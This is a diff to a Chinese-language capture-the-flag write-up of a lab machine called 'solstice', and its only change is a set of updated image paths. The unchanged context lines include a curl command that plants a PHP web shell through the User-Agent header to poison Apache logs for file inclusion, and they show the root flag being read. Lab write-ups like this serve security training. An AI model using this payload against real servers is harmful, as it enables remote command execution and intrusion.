@@ -341,10 +341,10 @@ Shellcodes: No Results
 ```
 ### web页面发现
 文件包含漏洞
-![Img](./FILES/solstice-192.168.146.67.md/img-20220722171238.png)
+![Img](../FILES/solstice-192.168.146.67.md/img-20220722171238.png)
 >由于目标服务器是apache, 所以查看一下日志文件
 > 发现能给出PPSESSID和日志信息, 那么就用get方式把请求方式后面加上个cmd
-![Img](./FILES/solstice-192.168.146.67.md/img-20220722171520.png)
+![Img](../FILES/solstice-192.168.146.67.md/img-20220722171520.png)
 ```
 └─$ curl 192.168.146.67 -A "<?php system(\$_GET['cmd'])?>"                                  
  <head>
@@ -508,5 +508,5 @@ ftp  root.txt
 cat root.txt
 
 ```
-![Img](./FILES/solstice-192.168.146.67.md/img-20220722174117.png)
+![Img](../FILES/solstice-192.168.146.67.md/img-20220722174117.png)
 
